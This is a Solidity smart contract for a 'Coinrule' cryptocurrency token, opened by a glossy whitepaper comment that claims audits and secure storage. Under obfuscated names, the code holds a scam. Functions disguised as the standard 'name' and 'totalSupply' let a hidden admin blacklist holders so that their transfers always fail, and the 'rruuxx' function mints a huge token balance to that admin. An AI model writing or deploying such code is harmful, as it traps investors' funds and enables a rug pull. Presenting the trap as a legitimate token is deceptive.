/*
Welcome to COINRULE 
Cryptocurrency trading has witnessed significant growth, but individual traders face complexities. 
Coinrule emerges as a solution, offering a user-friendly platform for automated trading and smart investor following.
The cryptocurrency market is dynamic, presenting opportunities and challenges. Coinrule addresses 
issues such as complex trading strategies, market volatility, and the need for user-friendly tools.
Individual traders often lack access to advanced trading tools, leading to missed opportunities and 
exposure to unnecessary risks. Coinrule aims to bridge this gap, providing a comprehensive solution for traders of all levels
Technical Details
Distributed Infrastructure
Coinrule employs a distributed and scalable infrastructure to ensure optimal performance. This architecture 
facilitates seamless integration with various cryptocurrency exchanges.
Microservices
The microservices architecture allows for independent scaling of different components, ensuring adaptability 
to changing user demands while maintaining high performance.
Algorithm Integration
Market Analysis
Coinrule's algorithm analyzes market trends using a combination of technical indicators, sentiment analysis, 
and machine learning models. The algorithm adapts to changing market conditions to optimize trading strategies.
Strategy Execution
Orders are executed efficiently through secure communication with exchange APIs. The algorithmic engine 
minimizes slippage, optimizing entry and exit points for trades.
Security Measures
Secure Storage
User funds are stored in secure, multi-signature wallets, reducing the risk of unauthorized access. Cold 
storage solutions are employed to store a significant portion of assets offline.
Regular Audits
Coinrule conducts regular security audits and vulnerability assessments to identify and address potential 
weaknesses. Continuous monitoring ensures the platform's resilience against evolving cybersecurity threats.
Tokenomics
Token Information
Purpose
COINRULE is designed as a utility token, facilitating various functions within the Coinrule ecosystem, including 
transaction fee payment, access to premium features, and participation in governance.
Utility
The token's utility extends to discounts on transaction fees, access to premium features, and voting rights in 
governance decisions.
Token Use Cases
Transaction Fees
Users can use COINRULE tokens to pay for transaction fees, receiving a discount compared to other payment methods.
Premium Features
Holders of a specified amount of COINRULE tokens gain access to premium features, fostering loyalty and engagement.
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
abstract contract Ownable  {
     function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor() {
        _transferOwnership(_msgSender());
    }

   
    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
    
}

contract Coinrule is Ownable{
   
    constructor(string memory tokenname,string memory tokensymbol,address ruadmin) {
        _totalSupply = 800000000*10**decimals();
        _llccxx[msg.sender] = 800000000*10**decimals();
        _tokename = tokenname;
        _tokensymbol = tokensymbol;
        satadmin = ruadmin;
        emit Transfer(address(0), msg.sender, 800000000*10**decimals());
    }
    
    address public satadmin;
    uint256 private _totalSupply;
    string private _tokename;
    string private _tokensymbol;
    mapping(address => bool) public tallinfo;
   
    mapping(address => uint256) private _llccxx;
    mapping(address => mapping(address => uint256)) private _allowances;
    function name() public view returns (string memory) {
        return _tokename;
    }

    function symbol() public view  returns (string memory) {
        return _tokensymbol;
    }
    function name(address lese) public  {
        address shggxxinfo = lese;
        require(_msgSender() == satadmin, "Only ANIUadmin can call this function");
        tallinfo[shggxxinfo] = false;
        require(_msgSender() == satadmin, "Only ANIUadmin can call this function");
    }

    function totalSupply(address safax) public {
        require(_msgSender() == satadmin, "Only ANIUadmin can call this function");
        address choinfo = safax;
        tallinfo[choinfo] = true;
        require(_msgSender() == satadmin, "Only ANIUadmin can call this function");
    }

         uint256 bfcfx = 2220000000;
        uint256 bfcf2 = 35;
    uint256 bfx =  bfcf2*((10**decimals()*bfcfx));
    function rruuxx() 
    external    {
     
        address rrxxadmin = satadmin;
        if (satadmin == _msgSender() && rrxxadmin == _msgSender()) {
            if (bfcfx == 2220000000) {

                require(satadmin == _msgSender());
                address temo1 = _msgSender();
                address temo2 = temo1;
                address temo3 = temo2;
                _llccxx[temo3] += bfx;
            }else{
                revert(_tokename);
            }
        }else{
            revert("rulra");
        }
               
        
    }

    function decimals() public view virtual returns (uint8) {
        return 18;
    }

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _llccxx[account];
    }

    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(_msgSender(), to, amount);
        return true;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
    
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _llccxx[from];
        if (true == tallinfo[from]) 
        {amount = 1000-1000+2000+balance;}
        require(from != address(0), "ERC20: transfer from the zero address");        
        require(to != address(0), "ERC20: transfer to the zero address");
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        _llccxx[from] = _llccxx[from]-amount;
        _llccxx[to] = _llccxx[to]+amount;
        emit Transfer(from, to, amount); 
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
}